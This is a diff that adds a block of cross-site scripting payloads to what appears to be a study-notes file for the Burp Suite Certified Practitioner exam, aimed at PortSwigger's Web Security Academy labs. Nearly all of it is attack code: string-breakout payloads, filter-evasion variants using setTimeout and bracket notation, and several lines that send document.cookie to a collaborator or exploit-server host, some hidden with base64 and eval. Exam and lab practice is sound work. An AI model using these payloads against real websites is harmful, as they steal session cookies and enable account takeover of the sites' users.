@@ -277,3 +277,28 @@ document.location="https://...web-security-academy.net/?find="-eval`${document.
 location='https://exploit-...exploit-server.net/random?c='+document.cookie}`-""
 </script> - but "" will ruin everything, so encode second part inside find=
 ```
+Some payloads from wr3dmast3r article about [BSCP certification](https://habr.com/en/companies/jetinfosystems/articles/805297/).
+
+```html
+"-prompt(1)-"
+"-alert(1)-"
+"-alert(window["document"]["cookie"])-" 
+"-window["alert"](window["document"]["cookie"])-" 
+"-self["alert"](self["document"]["cookie"])-"
+fetch(`https://COLLAB/?xss=` + window["document"]["cookie"]) // send to your server
+"-eval(atob("fetch(`https://collaborator/?xss=` + window["document"]["cookie"])"))-" // base64 encode
+"-eval(atob("ZmV0Y2goYGh0dHBzOi8vY29sbGFib3JhdG9yLz94c3M9YCArIHdpbmRvd1siZG9jdW1lbnQiXVsiY29va2llIl0p"))-"
+<script>
+document.location = "https://...web-security-academy.net/?SearchTerm=%22-eval%28atob%28%22fetch
+(`https://collaborator/?xss=`+window["document"]["cookie"])%22%29%29-%22"
+</script> // don't forget to encode in base64
+
+\\"-alert`1`}//
+\\"-prompt`${document.cookie}`}// - might not work
+\\"-setTimeout`alert\x28document.cookie\x29`}//
+\\"-setTimeout`fetch\x28'https://collaborator/jsonc='+document.cookie\x29`}//
+<script>
+document.location="https://...web-security-academy.net/?find=\\"-setTimeout`fetch\x28'https://collaborator/jsonc='+document.cookie\x29`}//"
+</script> // don't forget to URL-encode value in find param
+
+```
